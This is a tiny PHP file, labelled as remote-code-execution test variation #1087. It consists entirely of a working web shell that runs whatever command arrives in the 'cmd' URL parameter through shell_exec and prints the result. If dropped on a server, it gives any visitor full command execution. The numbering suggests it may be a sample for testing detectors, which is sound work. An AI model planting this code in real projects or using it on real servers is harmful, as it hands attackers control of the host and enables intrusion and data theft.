<?php
// RCE test variation #1087
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>